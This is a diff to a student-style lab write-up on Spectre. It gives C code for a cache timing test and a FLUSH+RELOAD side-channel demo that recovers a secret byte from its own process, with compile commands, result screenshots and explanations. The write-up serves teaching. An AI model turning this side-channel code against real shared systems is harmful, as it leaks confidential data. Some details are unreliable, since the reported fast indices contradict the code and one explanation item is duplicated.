@@ -499,3 +499,167 @@ During the **Out-of-Order execution**, the referenced memory is fetched into a r
 # Spectre Attack in C
 A Spectre attack is a type of security vulnerability that **exploits speculative execution** in modern microprocessors to access sensitive data. Potentially compromising the confidentiality of information. It allows attackers to trick a processor into **speculatively executing code** that should not be accessible, resulting in the leakage of sensitive data.
 
+Within this Spectre attack demonstration we will perform a technique called FLUSH+RELOAD to look through the CPU cache.
+### Step 1: Reading Cache vs Memory 
+```c
+#include <emmintrin.h>
+#include <x86intrin.h>
+uint8_t array[10*4096];
+int main(int argc, const char **argv) {
+int junk=0;
+register uint64_t time1, time2;
+volatile uint8_t *addr;
+int i;
+// Initialize the array
+for(i=0; i<10; i++) array[i*4096]=1;
+// FLUSH the array from the CPU cache
+for(i=0; i<10; i++) _mm_clflush(&array[i*4096]);
+// Access some of the array items
+array[3*4096] = 100;
+array[7*4096] = 200;
+for(i=0; i<10; i++) {
+addr = &array[i*4096];
+time1 = __rdtscp(&junk); ➀
+junk = *addr;
+time2 = __rdtscp(&junk) - time1; ➁
+printf("Access time for array[%d*4096]: %d CPU cycles\n",i, (int)time2);
+}
+return 0;
+}
+```
+We compiled and ran this code on Ubuntu 16.04 based on an AMD based system.
+```bash
+gcc -march=native cachetime.c
+```
+
+This outcome represents the findings from a single run. Based on our preliminary observations, it is clear that specific elements shows reduced CPU cycle times in contrast to others. This distinction underscores the differences in data access when comparing cache-based retrieval with data access from main memory. 
+![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161594776756432946/image.png?ex=6538de70&is=65266970&hm=aaa63349796dffe49bec266539904252b9e861b9472c8f8d0c89de19df9e8ed7&)
+To ensure both consistency and precision in our initial observations, the code was executed an additional ten times. The following results, relating to the arrays with index [5x4096], [6x4096], and [9x4096], consistently demonstrated lower CPU cycles when compared to the corresponding arrays in all test scenarios.
+
+1.
+![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161594935494053948/image.png?ex=6538de96&is=65266996&hm=7a6eb94e5ffca9bf19cb74b3428fe28c38ec99a8db2c52d89b2f06fa23d31724&)
+2.
+![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161595962754609192/CacheTime3.png?ex=6538df8a&is=65266a8a&hm=e8a17babca79f57d2f60b281dee5ce042183a024ac78c5c49c0a44b08df4b0c3&)
+3.
+![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161595972653154396/CacheTime4.png?ex=6538df8d&is=65266a8d&hm=ceddf2c6e93bc94e3682a91afc052f8c5bb74aa4aec3b74e8d957fbde8af4f09&)
+4.
+![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161595980668469360/CacheTime5.png?ex=6538df8f&is=65266a8f&hm=25305100165367e6cfe2d740b62e4d148dcec2a2a018d47485756fd94fce140d&)
+5.
+![Image](https://media.discordapp.net/attachments/1131246972372791429/1161595986997673984/CacheTime6.png?ex=6538df90&is=65266a90&hm=7e799954bf8f22babff53e9d299566467617be9bc7ec9bf9e37d5fbf46628eaa&=)
+6.
+![Image](https://media.discordapp.net/attachments/1131246972372791429/1161595991888232468/CacheTime7.png?ex=6538df91&is=65266a91&hm=87e3cc0b7d4edac4d06bdf22622508854a16e33a366e13047a84adb7ed1f1f49&=)
+7.
+![Image](https://media.discordapp.net/attachments/1131246972372791429/1161595996913012736/CacheTime8.png?ex=6538df93&is=65266a93&hm=c1b5f8e970eddf2c488c843eb7372119714566c370bf9eabb89aca3b36d4e613&=)
+8.
+![Image](https://media.discordapp.net/attachments/1131246972372791429/1161596004471164998/CacheTime9.png?ex=6538df94&is=65266a94&hm=db25339a9daa55f5ce25e750fccafe4d35b78e455c8dc3840ca61643d6ed1813&=)
+9.
+![Image](https://media.discordapp.net/attachments/1131246972372791429/1161596009340731412/CacheTime10.png?ex=6538df96&is=65266a96&hm=2873bb212992741dcc804eab4800e3b8fae3abe7ab0e7df6770b92bb67d986dd&=)
+10.
+![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161601101578129418/CacheTime11.png?ex=6538e454&is=65266f54&hm=2805e63a814cdc5324adcaa903856ef3cb5e58201f4575cfbf73406987d09ad7&)
+
+### Step 2: Using cache as a Side Channel attack
+
+```c
+#include <emmintrin.h>
+#include <x86intrin.h>
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdint.h>
+
+uint8_t array[256*4096];
+int temp;
+char secret = 94;
+/* cache hit time threshold assumed*/
+#define CACHE_HIT_THRESHOLD (80)
+#define DELTA 1024
+
+void victim()
+{
+  temp = array[secret*4096 + DELTA];
+}
+void flushSideChannel()
+{
+  int i;
+  // Write to array to bring it to RAM to prevent Copy-on-write
+  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;
+  //flush the values of the array from cache
+  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
+}
+
+void reloadSideChannel()
+{
+  int junk=0;
+  register uint64_t time1, time2;
+  volatile uint8_t *addr;
+  int i;
+  for(i = 0; i < 256; i++){
+   addr = &array[i*4096 + DELTA];
+   time1 = __rdtscp(&junk);
+   junk = *addr;
+   time2 = __rdtscp(&junk) - time1;
+   if (time2 <= CACHE_HIT_THRESHOLD){
+	printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
+        printf("The Secret = %d.\n",i);
+   }
+  } 
+}
+
+int main(int argc, const char **argv)
+{
+  flushSideChannel();
+  victim();
+  reloadSideChannel();
+  return (0);
+}
+```
+Within this step we demonstrate the **FLUSH+RELOAD** technique to find the one-byte secret value contained in the variable **secret**. The FLUSH+RELOAD technique consists of 3 steps:
+
+1. **Cache Purge (FLUSH)**: The entire array will be purged from cache memory to ensure the removal of any cached elements.
+2. **Cache Access (Invoke "Victim" Function)**: We invoke the **victim** function, which accesses one of the array elements based on the value of the secret. This will cause the corresponding array element to be cached.
+3. **Cache Reconnaissance (RELOAD)**: Reload the entire array while measuring the time required to reload each individual element. If one element exhibits notably fast loading times, it strongly suggest its inclusion within the cache. This specific element matches the one the 'victim' function used making it easier to figure out the secret value.
+
+**Code Compilation**
+```
+gcc -march=native FlushReload.c -o FlushReload
+```
+#### Result:
+![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161634969442074624/FlushReload1.png?ex=653903de&is=65268ede&hm=f65b6dcf476d095045335466739b5a424e07c9dd81b82dd10459aac55770f9d4&)
+As illustrated in the image above, despite encountering multiple results during the execution of FlushReload indicating that we have hit cashe_threshold multiple times, we still successfully pinpointed our secret value of 94. It has to be noted that we have conducted the test an additional four times to ensure the precision of our findings, and each of these repeated trials revealed the secret value.
+
+1.
+![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161639103943680040/FlushReload2.png?ex=653907b8&is=652692b8&hm=cc463e00b079ac0d0a0d4adee23709e7a62bad30f01d910188455b2c7376edc6&)
+2.
+![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161640100736802877/FlushReload3.png?ex=653908a6&is=652693a6&hm=d1020f4457562f98cb62b3f71cd4a28e3587b67d46b2b23359ded34dcb6f885c&)
+3.
+![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161640100736802877/FlushReload3.png?ex=653908a6&is=652693a6&hm=d1020f4457562f98cb62b3f71cd4a28e3587b67d46b2b23359ded34dcb6f885c&)
+4.
+![Image](https://cdn.discordapp.com/attachments/1131246972372791429/1161640807070171196/FlushReload4.png?ex=6539094e&is=6526944e&hm=ca583ef9bc646b94c3ebffb5b91e5ea61d6c51be3be84c91ee285c9328feb2b6&)
+
+### Explanation of FlushReload.c
+#### Global Variables
+
+In the provided code, a set of global variables takes on pivital roles in the program's operation:
+
+>1. **`uint8_t array[256*4096]`**: This array includes a 1-megabyte memory space, serving as the main data structure for recording cache timing metrics. It stands as an essential element in assessing memory access patterns.
+>2. **`int temp`**: The integer variable, `temp`, takes on the responsibility of storing the data retrieved from the array. It acts as an middleman in the victim function, where memory access is made.
+>3. **`char secret = 94`**: The `secret` variable is intended to represent a hidden value (specifically, 94), which the code aims to uncover through a cache timing analysis. The exploration of this value is the core focus of the program's execution.
+>4. **`CACHE_HIT_THRESHOLD` (set to 80)**: The `CACHE_HIT_THRESHOLD` constant defines the benchmark against which memory access times are measured. Any access operation that falls within this threshold is deemed indicative of a cache hit, crucial to discerning cached elements.
+>5. **`CACHE_HIT_THRESHOLD (set to 80)`**: The `CACHE_HIT_THRESHOLD` constant establishes the standard against which memory access times are gauged. Any access operation that falls within this standard is crucial for identifying cached elements.
+>
+>These global variables are fundamental to the program, enabling the cache timing attack. This attack measures memory access timings and may reveal cached elements, including the secret value.
+#### flushSideChannel()
+>The **`flushSideChannel()`** function in a `FLUSH+RELOAD` attack prepares the memory state for cache timing measurements. This is achieved by writing to the `array` to bring relevant memory locations into RAM and then purging the array's values from the CPU cache, establishing a consistent basis with no cached array elements. This sets the stage for precise monitoring of following memory access patterns, a crucial phase in the cache timing attack.
+
+### reloadSideChannel()
+>The `reloadSideChannel` function in the context of a FLUSH+RELOAD attack serves to identify cached memory locations through the measurement of access times. It performs the following key tasks:
+>1. **Initialization**: It prepares the necessary variables for temporary storage and timing measurements.
+>2. **Memory Access Loop**: The function iterates through 256 memory locations, recording access times for each.
+>3. **Access Timing Measurement**: Prior to and following the access of a specific memory location, it calculates the time duration of the access.
+>4. **Cache Hit Verification**: The function checks if the measured time matches or falls below the defined `CACHE_HIT_THRESHOLD`. When this happens it indicates that the memory location is cached. In response the function reports the location's index and the corresponding secret value.
+>
+>This function plays a crucial role in the FLUSH+RELOAD attack. It allows us to observe which memory locations are cached and potentially discover the hidden secret value by monitoring how memory is accessed.
+
+### Task 3: Out-of-Order Execution and Branch Prediction
+
+
+
